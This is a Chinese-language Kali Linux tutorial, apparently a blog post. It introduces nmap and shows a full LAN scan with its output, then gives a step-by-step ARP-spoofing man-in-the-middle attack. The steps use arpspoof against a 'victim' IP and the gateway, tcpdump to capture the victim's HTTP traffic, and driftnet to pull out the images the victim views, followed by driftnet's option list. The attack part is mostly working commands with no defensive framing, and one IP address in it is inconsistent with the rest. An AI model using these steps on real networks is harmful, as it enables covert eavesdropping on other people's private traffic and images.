Nmap，也就是Network Mapper，最早是Linux下的网络扫描和嗅探工具包。

nmap是一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。
确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统（这是亦称 fingerprinting）。
它是网络管理员必用的软件之一，以及用以评估网络系统安全。
正如大多数被用于网络安全的工具，nmap 也是不少黑客及骇客（又称脚本小子）爱用的工具 。
系统管理员可以利用nmap来探测工作环境中未经批准使用的服务器，但是黑客会利用nmap来搜集目标电脑的网络设定，从而计划攻击的方法。
Nmap 常被跟评估系统漏洞软件Nessus 混为一谈。Nmap 以隐秘的手法，避开闯入检测系统的监视，并尽可能不影响目标系统的日常操作。




执行扫描:
```shell script
root@kali:~# nmap -sS 192.168.0.1/24
```

```text
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-23 02:59 CST
Nmap scan report for 192.168.0.1
Host is up (0.11s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
1900/tcp open  upnp
MAC Address: 78:44:FD:77:53:EF (Tp-link Technologies)

Nmap scan report for 192.168.0.100
Host is up (0.0040s latency).
All 1000 scanned ports on 192.168.0.100 are filtered
MAC Address: 9C:A6:15:5C:37:D2 (Tp-link Technologies)

Nmap scan report for 192.168.0.101
Host is up (0.0039s latency).
All 1000 scanned ports on 192.168.0.101 are filtered
MAC Address: 28:2C:B2:C1:70:C1 (Tp-link Technologies)

Nmap scan report for 192.168.0.102
Host is up (0.14s latency).
Not shown: 999 filtered ports
PORT     STATE  SERVICE
6881/tcp closed bittorrent-tracker
MAC Address: 60:3A:7C:11:07:38 (Tp-link Technologies)

Nmap scan report for 192.168.0.103
Host is up (0.012s latency).
Not shown: 999 closed ports
PORT      STATE SERVICE
16080/tcp open  osxwebadmin
MAC Address: A4:50:46:6C:CE:65 (Xiaomi Communications)

Nmap scan report for 192.168.0.105
Host is up (0.22s latency).
Not shown: 999 closed ports
PORT      STATE SERVICE
62078/tcp open  iphone-sync
MAC Address: 54:99:63:33:AB:B5 (Apple)

Nmap scan report for 192.168.0.109
Host is up (0.00026s latency).
Not shown: 999 filtered ports
PORT    STATE SERVICE
135/tcp open  msrpc
MAC Address: 28:3A:4D:74:FA:41 (Cloud Network Technology (Samoa) Limited)

Nmap scan report for 192.168.0.128
Host is up (0.0000020s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 256 IP addresses (8 hosts up) scanned in 102.69 seconds
```


注意：运行 arpspoof 命令时提示：arpspoof未找到命令，其原因是你还未安装 arpspoof 工具；arpspoof 是 dsniff 的一个附属工具，所以我们需要安装的是 dsniff

打开一个控制台
```shell script
root@kali:~# apt-get install dsniff  #安装图片抓取工具
root@kali:~# arpspoof -i eth0 -t 192.168.0.103(受害者ip) 192.168.0.1(路由器ip,也就是你的网关)   #告诉192.168.0.103(受害者ip),我是路由器
```

我们再打开一个控制台：
```shell script
root@kali:~# arpspoof -i eth0 -t 192.168.0.1(路由器ip,也就是你的网关) 192.168.1.101(我的ip)    #告诉路由器,我的ip是(受害者)
``` 

我们再打开一个控制台：
```shell script
root@kali:~# tcpdump tcp -nnAi eth0 port 80 and host 192.168.0.103(受害者ip)
``` 

安装图形捕获工具driftnet
```shell script
root@kali:~# apt-get install driftnet   #安装图形显示软件
root@kali:~# driftnet -i eth0    #获取0号网卡数据显示   
``` 

driftnet [选项] [过滤码]
选项：
-h              显示此帮助信息。
-v              详细操作。
-b              拍摄新图像时发出哔哔声。
-i interface    选择要监听的界面（默认：全部接口）。
-f file         文件而不是在接口上侦听，读取捕获来自pcap转储文件的数据包;文件可以是一个命名管道与Kismet或类似的使用。
-p              不要将听音界面设置为混音模式。
-a              附加模式：不要在屏幕上显示图像，但保存他们到一个临时目录，并宣布他们的名字标准输出。
-m number       在临时目录中保留的最大图像数量在辅助模式下。
-d directory    使用指定的临时目录。
-x prefix       在保存图像时使用的前缀。
-s              尝试从网络提取流式音频数据，除了图像。目前这个支持MPEG数据只要。
-S              提取流式音频而不是图像。
-M command      使用给定的命令播放提取的MPEG音频数据与-s选项;这应该处理MPEG帧在标准输入上提供。默认：`mpg123 - '。


